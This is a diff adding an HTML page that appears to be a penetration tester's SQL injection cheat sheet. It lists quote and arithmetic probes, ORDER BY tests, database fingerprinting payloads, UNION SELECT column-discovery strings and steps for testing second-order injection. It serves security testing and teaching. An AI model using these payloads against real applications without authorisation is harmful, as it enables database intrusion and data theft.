@@ -1,0 +1,86 @@
+<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+<title>Detection</title>
+</head><body><span style="font-size: 14pt"><b>DETECTION</b><br/>
+</span><ul><li style="list-style-type: none"><b>BASIC</b></li>
+</ul>
+<ul><li>Submit <tt>'</tt>to every Header, GET parameter, POST parameter, Cookie</li>
+<li>Submit <tt>''</tt>to suspicious input points</li>
+<li>Try <tt>1+1</tt>instead of <tt>2</tt>to see if backend calculates input</li>
+<li style="list-style-type: none"><ul><li>Try <tt>51-ASCII(1)</tt>which is equal 2</li>
+</ul>
+</li>
+<li>Urlencode <tt>space, &amp;, =, +, ;</tt></li>
+</ul>
+<ul><li style="list-style-type: none"><b>ADVANCED</b></li>
+</ul>
+<ul><li>Find parameters which controls order of fields returned</li>
+<li>Inject consequently numeric values 1,2,3 (this can be passed to ORDER BY clause and sort output by 1st,... columns)</li>
+<li>Confirm previous injection by injecting</li>
+<li style="list-style-type: none"><ul><li><tt>1 ASC --</tt></li>
+<li><tt>1 DESC --</tt></li>
+</ul>
+</li>
+<li>If '1' appears in results in each row returned then '1' is passed as</li>
+<li style="list-style-type: none"><ul><li><tt>SELECT 1,title,year FROM books WHERE publisher='Wiley'</tt></li>
+</ul>
+</li>
+</ul>
+<br/>
+<ul><li style="list-style-type: none"><b>POLYGLOTS</b></li>
+</ul>
+<ul><li><tt>/usr/share/wordlists/SecLists/Fuzzing/Polyglots/SQLi-Polyglots.txt</tt></li>
+<li style="list-style-type: none"/>
+</ul>
+<b>Fingerprinting the Database</b><ul><b><li style="list-style-type: none"/>
+<li style="list-style-type: none">By string value</li>
+</b></ul>
+<ul><li style="list-style-type: none">Test following injections. If applicatation returns string correctly then we have the match.</li>
+<li>Oracle: <tt>'serv'||'ices'</tt></li>
+<li>MS-SQL: <tt>'serv'+'ices'</tt></li>
+<li>MySQL: <tt>'serv' 'ices'</tt></li>
+<b><li style="list-style-type: none"/>
+<li style="list-style-type: none">By numerical value</li>
+</b></ul>
+<ul><li style="list-style-type: none">Each of these items evaluates to 0 on the target database and generates an error on the other databases.</li>
+<li>Oracle: <tt>BITAND(1,1)-BITAND(1,1)</tt></li>
+<li>MS-SQL: <tt>@@PACK_RECEIVED-@@PACK_RECEIVED</tt></li>
+<li>MySQL: <tt>CONNECTION_ID()-CONNECTION_ID()</tt></li>
+</ul>
+<ul><b><li style="list-style-type: none">By Postgres cast operator ::</li>
+</b></ul>
+<ul><li><tt>http:/www.example.com/store.php?id=1 AND 1::int=1</tt></li>
+</ul>
+<br/>
+<b>The UNION Operator</b><br/>
+<ul><li>Discover the number of columns returned by the original query. Inject following until you see new row returned in HTML</li>
+</ul>
+<ul><li style="list-style-type: none"><ul><li><tt>AAA' UNION SELECT NULL--</tt></li>
+<li><tt>AAA' UNION SELECT NULL, NULL--</tt></li>
+<li>AAA<tt>' UNION SELECT NULL, NULL, NULL--</tt></li>
+</ul>
+</li>
+</ul>
+<ul><li>Discover a column that has a string data type so that you can use this to extract arbitrary data</li>
+</ul>
+<ul><li style="list-style-type: none"><ul><li>AAA<tt>' UNION SELECT 'a', NULL, NULL--</tt></li>
+<li>AAA<tt>' UNION SELECT NULL, 'a', NULL--</tt></li>
+<li>AAA<tt>' UNION SELECT NULL, NULL, 'a'--</tt></li>
+</ul>
+</li>
+</ul>
+<ul><li style="list-style-type: none">For ORACLE db FROM clause must be suplied</li>
+</ul>
+<ul><li style="list-style-type: none"><ul><li>AAA<tt>' UNION SELECT NULL FROM DUAL--</tt></li>
+</ul>
+</li>
+</ul>
+<br/>
+<b>Test for second-order SQL injections</b><br/>
+<ul><li>Register new user ending with '</li>
+<li>If app changes all ' to '' the username can be still INSERTed as foo'</li>
+<li>Such username can be used by application in other db queries.</li>
+<li>Test app functions for authenticated users if they works as they shoud.</li>
+</ul>
+</body></html>
